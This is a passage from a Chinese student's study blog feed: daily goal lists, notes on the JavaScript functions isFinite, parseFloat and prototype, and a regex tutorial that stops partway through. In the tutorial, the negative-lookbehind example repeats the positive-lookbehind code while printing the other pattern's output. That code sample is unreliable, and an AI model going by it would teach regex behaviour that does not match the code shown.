<h2 id="2020-01-05总结"><a href="#2020-01-05总结" class="headerlink" title="2020-01-05总结"></a>2020-01-05总结</h2><p>总的来说今天算是给自己放了个假，睡觉睡到中午，打了一个下午排球，到晚上七点左右才开始学习，也算是给这些天有点低迷的心情缓和一下吧！</p>
<ol>
<li>总算把域名调试好了，不然deploy一次就给我发一封邮件我受不住（GNAME文件中多打了www）</li>
<li>JS 表单- JS验证API</li>
<li>南邮ctf <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">AAencode</a></li>
<li>复习了一会会英语</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(0/10)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>10</td>
</tr>
<tr>
<td>继续学习完善正则表达式</td>
<td>0</td>
</tr>
<tr>
<td>南邮ctf <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">AAencode</a></td>
<td>10</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/js/js-conventions.html" target="_blank" rel="noopener">学习至JS代码规范</a></td>
<td>6</td>
</tr>
<tr>
<td>花一点时间备考大英1</td>
<td>5</td>
</tr>
<tr>
<td>状态</td>
<td>6</td>
</tr>
</tbody></table>
<h2 id="对于南邮-AAencode那一题："><a href="#对于南邮-AAencode那一题：" class="headerlink" title="对于南邮 AAencode那一题："></a>对于南邮 AAencode那一题：</h2><ol>
<li>以后看到中文乱码可以下载本地有utf-8换一下</li>
<li>AAencode是一种把JS代码转化成颜文字的加密，直接在console里运行即可解码</li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>JS isFinite函数 [检测是否为无穷大]</title>
    <url>/2020/01/06/JS-isFinite%E5%87%BD%E6%95%B0-%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E4%B8%BA%E6%97%A0%E7%A9%B7%E5%A4%A7/</url>
    <content><![CDATA[<h2 id="isFinite"><a href="#isFinite" class="headerlink" title="isFinite()"></a>isFinite()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>如果 number 是 NaN（非数字），或者是正、负无穷大的数，则返回 false。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">isFinite(value)</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.write(isFinite(123)+ &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(isFinite(-1.23)+ &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(isFinite(5-2)+ &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(isFinite(0)+ &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(isFinite(&quot;Hello&quot;)+ &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(isFinite(&quot;2005&#x2F;12&#x2F;12&quot;)+ &quot;&lt;br&gt;&quot;);</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">true</span><br><span class="line">true</span><br><span class="line">true</span><br><span class="line">true</span><br><span class="line">false</span><br><span class="line">false</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>Js parseFloat()函数 [去除数字后的非数字字符]</title>
    <url>/2020/01/05/Js-parseFloat-%E5%87%BD%E6%95%B0-%E5%8E%BB%E9%99%A4%E6%95%B0%E5%AD%97%E5%90%8E%E7%9A%84%E9%9D%9E%E6%95%B0%E5%AD%97%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<h2 id="parseFloat"><a href="#parseFloat" class="headerlink" title="parseFloat()"></a>parseFloat()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>该函数指定字符串中的首个字符是否是数字。如果是，则对字符串进行解析，直到到达数字的末端为止，然后以数字返回该数字，而不是作为字符串。</p>
<p><em>其实就是要有一段字符串然后以数字开头，然后开始检索，遇到第一个不是数字的（空格也算）就把后头（包括这个）全砍掉。</em></p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parseFloat(string)</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">document.write(parseFloat(&quot;10&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(parseFloat(&quot;10.00&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(parseFloat(&quot;10.33&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(parseFloat(&quot;34 45 66&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(parseFloat(&quot;   60   &quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(parseFloat(&quot;40 years&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(parseFloat(&quot;He was 40&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10</span><br><span class="line">10</span><br><span class="line">10.33</span><br><span class="line">34</span><br><span class="line">60</span><br><span class="line">40</span><br><span class="line">NaN</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-01-05日目标</title>
    <url>/2020/01/05/2020-01-05%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-05日目标"><a href="#2020-01-05日目标" class="headerlink" title="2020-01-05日目标"></a>2020-01-05日目标</h2><ol>
<li>听力10min+单词10个</li>
<li>继续学习完善正则表达式</li>
<li>南邮ctf <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">AAencode</a></li>
<li><a href="https://www.runoob.com/js/js-conventions.html" target="_blank" rel="noopener">学习至JS代码规范</a></li>
<li>花一点时间备考大英1</li>
</ol>
<h2 id="2020-01-04总结"><a href="#2020-01-04总结" class="headerlink" title="2020-01-04总结"></a>2020-01-04总结</h2><ol>
<li><a href="https://blog.csdn.net/h610443955/article/details/81079439" target="_blank" rel="noopener">发现了一篇有关正则表达式不错的文章</a>并学习整理了第一章节</li>
<li>在阿里云买了域名并绑定了博客，以后可以直接访问 <a href="www.albatross-g.site">我的新域名</a></li>
<li>复习了高数的渐近线和间断点</li>
<li>Js正则表达式-JS使用误区</li>
<li>完成了bugku前三道简单题（和南邮前三题几乎一样）</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(0/10)</th>
</tr>
</thead>
<tbody><tr>
<td>完善今日对 JS正则表达式 的整理</td>
<td>8</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/js/js-conventions.html" target="_blank" rel="noopener">学习至JS代码规范</a></td>
<td>6</td>
</tr>
<tr>
<td>南邮ctf <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">AAencode</a></td>
<td>0</td>
</tr>
<tr>
<td>听力10min+单词10个</td>
<td>5</td>
</tr>
<tr>
<td>9:00去图书馆</td>
<td>9</td>
</tr>
<tr>
<td>状态</td>
<td>6</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>JS prototype属性</title>
    <url>/2020/01/04/JS-prototype%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<h2 id="prototype属性"><a href="#prototype属性" class="headerlink" title="prototype属性"></a>prototype属性</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>prototype 属性允许您向对象添加属性和方法</p>
<p><strong>*注意：</strong> Prototype 是全局属性，适用于所有的 Javascript 对象。*</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object.prototype.name&#x3D;value;</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function employee(name,jobtitle,born)&#123;</span><br><span class="line">	this.name&#x3D;name;</span><br><span class="line">	this.jobtitle&#x3D;jobtitle;</span><br><span class="line">	this.born&#x3D;born;</span><br><span class="line">&#125;</span><br><span class="line">var fred&#x3D;new employee(&quot;Fred Flintstone&quot;,&quot;Caveman&quot;,1970);</span><br><span class="line">employee.prototype.salary&#x3D;null;</span><br><span class="line">fred.salary&#x3D;20000;</span><br><span class="line">document.write(fred.salary);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，prototype函数将salary属性的值清空，便于接下来的赋值。</p>
]]></content>
      <categories>
        <category>JS 属性整理</category>
      </categories>
      <tags>
        <tag>属性</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-01-04日目标</title>
    <url>/2020/01/04/2020-01-04%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-04日目标"><a href="#2020-01-04日目标" class="headerlink" title="2020-01-04日目标"></a>2020-01-04日目标</h2><ol>
<li>完善今日对 JS正则表达式 的整理</li>
<li><a href="https://www.runoob.com/js/js-conventions.html" target="_blank" rel="noopener">学习至JS代码规范</a></li>
<li>南邮ctf <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">AAencode</a></li>
<li>听力10min+单词10个</li>
<li>9:00去图书馆</li>
</ol>
<h2 id="2020-01-03总结"><a href="#2020-01-03总结" class="headerlink" title="2020-01-03总结"></a>2020-01-03总结</h2><ol>
<li>初步入门了 CSS盒子模型</li>
<li>完成了南邮ctf “这题不是web”和“层层递进”   （两题纯脑洞基本不含技术）</li>
<li>共整理了JS 五个函数</li>
<li>对JS 正则表达式有了初步了解</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(0/10)</th>
</tr>
</thead>
<tbody><tr>
<td>10min英语听力+10个英语单词</td>
<td>0</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/js/js-typeof.html" target="_blank" rel="noopener">JS typeof操作符</a>-JS代码规范</td>
<td>5</td>
</tr>
<tr>
<td><a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">南邮ctf “这题不是web”</a></td>
<td>10</td>
</tr>
<tr>
<td>CSS盒子模型</td>
<td>9</td>
</tr>
<tr>
<td>9:30在1307考html</td>
<td>7</td>
</tr>
<tr>
<td>状态</td>
<td>5</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>JS 正则表达式（持续更新）</title>
    <url>/2020/01/04/JS-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>正则表达式是由一个字符序列形成的搜索模式。</p>
<p>当你在文本中搜索数据时，你可以用搜索模式来描述你要查询的内容。</p>
<p>正则表达式可以是一个简单的字符，或一个更复杂的模式。</p>
<p>正则表达式可用于所有文本搜索和文本替换的操作。</p>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;正则表达式主体&#x2F;修饰符(可选)</span><br></pre></td></tr></table></figure>

<h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><table>
<thead>
<tr>
<th>修饰符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>i</td>
<td>执行对大小写不敏感的匹配。</td>
</tr>
<tr>
<td>g</td>
<td>执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。</td>
</tr>
<tr>
<td>m</td>
<td>执行多行匹配</td>
</tr>
</tbody></table>
<h2 id="正则表达式模式"><a href="#正则表达式模式" class="headerlink" title="正则表达式模式"></a>正则表达式模式</h2><p>正则表达式是匹配模式，要么匹配字符，要么匹配位置。</p>
<h3 id="字符匹配"><a href="#字符匹配" class="headerlink" title="字符匹配"></a>字符匹配</h3><h4 id="两种模糊匹配"><a href="#两种模糊匹配" class="headerlink" title="两种模糊匹配"></a>两种模糊匹配</h4><h5 id="m-n-横向模糊匹配"><a href="#m-n-横向模糊匹配" class="headerlink" title="{m,n}横向模糊匹配"></a>{m,n}横向模糊匹配</h5><p>横向模糊指的是，一个正则可匹配的字符串的长度不是固定的，可以是多种情况的。</p>
<blockquote>
<p>譬如<code>{m,n}</code>，表示连续出现最少m次，最多n次。</p>
</blockquote>
<h5 id="abc-纵向模糊匹配"><a href="#abc-纵向模糊匹配" class="headerlink" title="[abc]纵向模糊匹配"></a>[abc]纵向模糊匹配</h5><p>纵向模糊指的是，一个正则匹配的字符串，具体到某一位字符时，它可以不是某个确定的字符，可以有多种可能。</p>
<blockquote>
<p>譬如<code>[abc]</code>，表示该字符是可以字符“a”、“b”、“c”中的任何一个。</p>
</blockquote>
<p><em>需要强调的是，虽叫字符组（字符类），但只是其中一个字符。例如<code>[abc]</code>，表示匹配一个字符，它可以是“a”、“b”、“c”之一。</em></p>
<h4 id="字符组"><a href="#字符组" class="headerlink" title="字符组"></a>字符组</h4><h5 id="a-z-范围表示"><a href="#a-z-范围表示" class="headerlink" title="[a-z]范围表示"></a>[a-z]范围表示</h5><p>比如<code>[123456abcdefGHIJKLM]</code>，可以写成<code>[1-6a-fG-M]</code>。用连字符<code>-</code>来省略和简写。</p>
<blockquote>
<p>Q:那么要匹配“a”、“-”、“z”这三者中任意一个字符，该怎么做呢？</p>
<p>A:可以写成如下的方式：<code>[-az]</code>或<code>[az-]</code>或<code>[a\-z]</code>。即要么放在开头，要么放在结尾，要么转义。</p>
</blockquote>
<h5 id="abc-排除字符组"><a href="#abc-排除字符组" class="headerlink" title="[^abc]排除字符组"></a>[^abc]排除字符组</h5><p>排除字符组（反义字符组）就是，某位字符可以是任何东西，但就不能是”a”、”b”、”c”。</p>
<h5 id="d类似的简写形式"><a href="#d类似的简写形式" class="headerlink" title="\d类似的简写形式"></a>\d类似的简写形式</h5><blockquote>
<p><strong><code>\d</code></strong>就是<code>[0-9]</code>。表示是一位数字。记忆方式：其英文是digit（数字）。</p>
<p><strong><code>\D</code></strong>就是<code>[^0-9]</code>。表示除数字外的任意字符。</p>
<p><strong><code>\w</code></strong>就是<code>[0-9a-zA-Z_]</code>。表示数字、大小写字母和下划线。记忆方式：w是word的简写，也称单词字符。</p>
<p><strong><code>\W</code></strong>是<code>[^0-9a-zA-Z_]</code>。非单词字符。</p>
<p><strong><code>\s</code></strong>是<code>[ \t\v\n\r\f]</code>。表示空白符，包括空格、水平制表符、垂直制表符、换行符、回车符、换页符。记忆方式：s是space character的首字母。</p>
<p><strong><code>\S</code></strong>是<code>[^ \t\v\n\r\f]</code>。 非空白符。</p>
<p><strong><code>.</code></strong>就是<code>[^\n\r\u2028\u2029]</code>。通配符，表示几乎任意字符。换行符、回车符、行分隔符和段分隔符除外。记忆方式：想想省略号…中的每个点，都可以理解成占位符，表示任何类似的东西。</p>
</blockquote>
<blockquote>
<p>Q:如果要匹配任意字符怎么办？</p>
<p>A:可以使用<code>[\d\D]</code>、<code>[\w\W]</code>、<code>[\s\S]</code>和<code>[^]</code>中任何的一个。</p>
</blockquote>
<h4 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h4><h5 id="m-类似的简写形式"><a href="#m-类似的简写形式" class="headerlink" title="{m,}类似的简写形式"></a>{m,}类似的简写形式</h5><blockquote>
<p><code>{m,}</code> 表示至少出现m次。</p>
<p><code>{m}</code> 等价于<code>{m,m}</code>，表示出现m次。</p>
<p>? 等价于{0,1}，表示出现或者不出现。记忆方式：问号的意思表示，有吗？</p>
<p><code>+</code>等价于<code>{1,}</code>，表示出现至少一次。记忆方式：加号是追加的意思，得先有一个，然后才考虑追加。</p>
<p><code>*</code> 等价于<code>{0,}</code>，表示出现任意次，有可能不出现。记忆方式：看看天上的星星，可能一颗没有，可能零散有几颗，可能数也数不过来。</p>
</blockquote>
<h5 id="贪婪匹配和惰性匹配"><a href="#贪婪匹配和惰性匹配" class="headerlink" title="贪婪匹配和惰性匹配"></a>贪婪匹配和惰性匹配</h5><h6 id="d-m-n-贪婪匹配"><a href="#d-m-n-贪婪匹配" class="headerlink" title="/\d{m,n}/贪婪匹配"></a>/\d{m,n}/贪婪匹配</h6><p>其中正则<code>/\d{2,5}/</code>，表示数字连续出现2到5次。会匹配2位、3位、4位、5位连续数字。</p>
<p>实例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var regex &#x3D; &#x2F;\d&#123;2,5&#125;&#x2F;g;</span><br><span class="line">var string &#x3D; &quot;123 1234 12345 123456&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; [&quot;123&quot;, &quot;1234&quot;, &quot;12345&quot;, &quot;12345&quot;]</span><br></pre></td></tr></table></figure>



<h6 id="d-m-n-惰性匹配"><a href="#d-m-n-惰性匹配" class="headerlink" title="/\d{m,n}?/惰性匹配"></a>/\d{m,n}?/惰性匹配</h6><p>其中<code>/\d{2,5}?/</code>表示，虽然2到5次都行，当2个就够的时候，就不在往下尝试了。</p>
<p>实例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var regex &#x3D; &#x2F;\d&#123;2,5&#125;?&#x2F;g;</span><br><span class="line">var string &#x3D; &quot;123 1234 12345 123456&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; [&quot;12&quot;, &quot;12&quot;, &quot;34&quot;, &quot;12&quot;, &quot;34&quot;, &quot;12&quot;, &quot;34&quot;, &quot;56&quot;]</span><br></pre></td></tr></table></figure>

<p>通过在量词后面加个问号就能实现惰性匹配，因此所有惰性匹配情形如下：</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;m,n&#125;?</span><br><span class="line">&#123;m,&#125;?</span><br><span class="line">??</span><br><span class="line">+?</span><br><span class="line">*?</span><br></pre></td></tr></table></figure>
</blockquote>
<p><em>惰性匹配指的是在现有情况下去匹配最优（少）解，比如”??”代表1or0，如果匹配不到1则匹配0.</em></p>
<h4 id="a-b-多选分支"><a href="#a-b-多选分支" class="headerlink" title="/a|b/多选分支"></a>/a|b/多选分支</h4><p>具体形式如下：<code>(p1|p2|p3)</code>，其中<code>p1</code>、<code>p2</code>和<code>p3</code>是子模式，用<code>|</code>（管道符）分隔，表示其中任何之一。</p>
<p>实例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var regex &#x3D; &#x2F;good|nice&#x2F;g;</span><br><span class="line">var string &#x3D; &quot;good idea, nice try.&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; [&quot;good&quot;, &quot;nice&quot;]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Q:/a|b/和/[ab]/有什么区别呢？</p>
<p>A: emmm不太好讲，大家自己先体会下，等我变牛了来告诉你们！</p>
</blockquote>
<p>注：但有个事实我们应该注意，比如我用<code>/good|goodbye/</code>，去匹配”goodbye”字符串时，结果是”good”：*</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var regex &#x3D; &#x2F;good|goodbye&#x2F;g;</span><br><span class="line">var string &#x3D; &quot;goodbye&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; [&quot;good&quot;]</span><br></pre></td></tr></table></figure>

<p><em>也就是说，分支结构也是惰性的，即当前面的匹配上了，后面的就不再尝试了（前提是两者要有重复部分）。</em></p>
<h4 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h4><h5 id="匹配16进制颜色值"><a href="#匹配16进制颜色值" class="headerlink" title="匹配16进制颜色值"></a><strong>匹配16进制颜色值</strong></h5><p>Q:要求匹配</p>
<blockquote>
<p>#ffbbad</p>
<p>#Fc01DF</p>
<p>#FFF</p>
<p>#ffE</p>
</blockquote>
<p>A:</p>
<blockquote>
<p>/#([0-9a-fA-F]{6}|[0-9a-fA-F]{3})/g</p>
</blockquote>
<h5 id="匹配时间"><a href="#匹配时间" class="headerlink" title="匹配时间"></a><strong>匹配时间</strong></h5><p>Q:要求匹配</p>
<blockquote>
<p>23:59</p>
<p>02:07</p>
</blockquote>
<p>A:</p>
<blockquote>
<p><code>/([01][0-9]|[2][0-3]):([0-5][0-9])/</code></p>
</blockquote>
<h5 id="window操作系统文件路径"><a href="#window操作系统文件路径" class="headerlink" title="window操作系统文件路径"></a><strong>window操作系统文件路径</strong></h5><p>Q:要求匹配</p>
<blockquote>
<p>F:\study\javascript\regex\regular expression.pdf</p>
<p>F:\study\javascript\regex\</p>
<p>F:\study\javascript</p>
<p>F:\</p>
</blockquote>
<p>A:</p>
<blockquote>
<p><code>/^[a-zA-Z]:\\([^\\:*&lt;&gt;|&quot;?\r\n/]+\\)*([^\\:*&lt;&gt;|&quot;?\r\n/]+)?$/</code></p>
</blockquote>
<h3 id="位置匹配"><a href="#位置匹配" class="headerlink" title="位置匹配"></a>位置匹配</h3><h4 id="6个锚字符"><a href="#6个锚字符" class="headerlink" title="6个锚字符"></a>6个锚字符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^ </span><br><span class="line">$ </span><br><span class="line">\b </span><br><span class="line">\B </span><br><span class="line">(?&#x3D;p) </span><br><span class="line">(?!p)</span><br></pre></td></tr></table></figure>



<h5 id="和"><a href="#和" class="headerlink" title="^和$"></a>^和$</h5><p><code>^</code>（脱字符）匹配开头，在多行匹配中匹配行开头。</p>
<p><code>$</code>（美元符号）匹配结尾，在多行匹配中匹配行结尾。</p>
<p><em>多行匹配模式时，二者是<strong>行</strong>的概念，这个需要我们的注意：</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var result &#x3D; &quot;I\nlove\njavascript&quot;.replace(&#x2F;^|$&#x2F;gm, &#39;#&#39;);</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"></span><br><span class="line">#I#</span><br><span class="line"></span><br><span class="line">#love#</span><br><span class="line"></span><br><span class="line">#javascript#</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>



<h5 id="b和-B"><a href="#b和-B" class="headerlink" title="\b和\B"></a><strong>\b和\B</strong></h5><p><code>\b</code>是单词边界，具体就是<code>\w</code>和<code>\W</code>之间的位置，也包括<code>\w</code>和<code>^</code>之间的位置，也包括<code>\w</code>和<code>$</code>之间的位置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var result &#x3D; &quot;[JS] Lesson_01.mp4&quot;.replace(&#x2F;\b&#x2F;g, &#39;#&#39;);</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &quot;[#JS#] #Lesson_01#.#mp4#&quot;</span><br></pre></td></tr></table></figure>

<p><code>\B</code>就是<code>\b</code>的反面的意思，非单词边界。例如在字符串中所有位置中，扣掉<code>\b</code>，剩下的都是<code>\B</code>的。</p>
<p>具体说来就是<code>\w</code>与<code>\w</code>、<code>\W</code>与<code>\W</code>、<code>^</code>与<code>\W</code>，<code>\W</code>与<code>$</code>之间的位置。</p>
<p>比如上面的例子，把所有<code>\B</code>替换成”#”：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var result &#x3D; &quot;[JS] Lesson_01.mp4&quot;.replace(&#x2F;\B&#x2F;g, &#39;#&#39;);</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &quot;#[J#S]# L#e#s#s#o#n#_#0#1.m#p#4&quot;</span><br></pre></td></tr></table></figure>



<h5 id="p-和-p"><a href="#p-和-p" class="headerlink" title="(?=p)和(?!p)"></a><strong>(?=p)和(?!p)</strong></h5><p><code>(?=p)</code>，其中 <code>p</code> 是一个子模式，即 <code>p</code> 前面的位置，或者说，该位置后面的字符要匹配 <code>p</code>。比如<code>(?=l)</code>，表示 <code>l</code> 字符前面的位置，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let result &#x3D; &#39;lemon&#39;.replace(&#x2F;(?&#x3D;l)&#x2F;g, &#39;#&#39;);</span><br><span class="line">console.log(result);</span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; #lemon</span><br></pre></td></tr></table></figure>

<p>而 <code>(?!p)</code> 就是<code>(?=p)</code> 的反面意思，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let result &#x3D; &#39;lemon&#39;.replace(&#x2F;(?!l)&#x2F;g, &#39;#&#39;);</span><br><span class="line">console.log(result);</span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; l#e#m#o#n#</span><br></pre></td></tr></table></figure>

<p>二者的学名分别是positive lookahead 和 negative lookahead。中文意思分别为正向先行断言和负向先行断言。ES5之后的版本，会支持positive lookbehind 和 negative lookbehind。意思是正向后行断言和负向后行断言。具体是<code>(?&lt;=p)</code> 和 (?&lt;!p)。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let result &#x3D; &#39;lemon&#39;.replace(&#x2F;(?&lt;&#x3D;l)&#x2F;g, &#39;#&#39;);</span><br><span class="line">console.log(result);</span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; l#emon</span><br></pre></td></tr></table></figure>

<p>表示该位置之前的字符要匹配 <code>l</code> 表达式。而 (?&lt;!p) 为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let result &#x3D; &#39;lemon&#39;.replace(&#x2F;(?&lt;&#x3D;l)&#x2F;g, &#39;#&#39;);</span><br><span class="line">console.log(result);</span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; #le#m#o#n#</span><br></pre></td></tr></table></figure>

<p>表示该位置之前的字符不能匹配 <code>l</code>。</p>
<h4 id="相关案例"><a href="#相关案例" class="headerlink" title="相关案例"></a>相关案例</h4><h5 id="不匹配任何东西的正则"><a href="#不匹配任何东西的正则" class="headerlink" title="不匹配任何东西的正则"></a><strong>不匹配任何东西的正则</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;.^&#x2F;</span><br></pre></td></tr></table></figure>



<h5 id="数字的千位分隔符表示法"><a href="#数字的千位分隔符表示法" class="headerlink" title="数字的千位分隔符表示法"></a><strong>数字的千位分隔符表示法</strong></h5><h6 id="弄出最后一个逗号"><a href="#弄出最后一个逗号" class="headerlink" title="弄出最后一个逗号"></a><strong>弄出最后一个逗号</strong></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var result &#x3D; &quot;12345678&quot;.replace(&#x2F;(?&#x3D;\d&#123;3&#125;$)&#x2F;g, &#39;,&#39;)</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &quot;12345,678&quot;</span><br></pre></td></tr></table></figure>

<h6 id="弄出所有的逗号"><a href="#弄出所有的逗号" class="headerlink" title="弄出所有的逗号"></a><strong>弄出所有的逗号</strong></h6><p>因为逗号出现的位置，要求后面3个数字一组，也就是<code>\d{3}</code>至少出现一次。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var result &#x3D; &quot;12345678&quot;.replace(&#x2F;(?&#x3D;(\d&#123;3&#125;)+$)&#x2F;g, &#39;,&#39;)</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &quot;12,345,678&quot;</span><br></pre></td></tr></table></figure>

<h6 id="匹配其余案例"><a href="#匹配其余案例" class="headerlink" title="匹配其余案例"></a><strong>匹配其余案例</strong></h6><p>我们要求匹配的到这个位置不能是开头。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var string1 &#x3D; &quot;12345678&quot;,</span><br><span class="line"></span><br><span class="line">string2 &#x3D; &quot;123456789&quot;;</span><br><span class="line"></span><br><span class="line">reg &#x3D; &#x2F;(?!^)(?&#x3D;(\d&#123;3&#125;)+$)&#x2F;g;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">var result &#x3D; string1.replace(reg, &#39;,&#39;)</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &quot;12,345,678&quot;</span><br></pre></td></tr></table></figure>

<p><strong><em>(?!^)代表我们将匹配的字符串其后面一位不能是^,即开头</em></strong></p>
<h5 id="支持其他形式"><a href="#支持其他形式" class="headerlink" title="支持其他形式"></a><strong>支持其他形式</strong></h5><p>如果要把”12345678 123456789”替换成”12,345,678 123,456,789”。</p>
<p>此时我们需要修改正则，把里面的开头<code>^</code>和结尾<code>$</code>，替换成<code>\b</code>：</p>
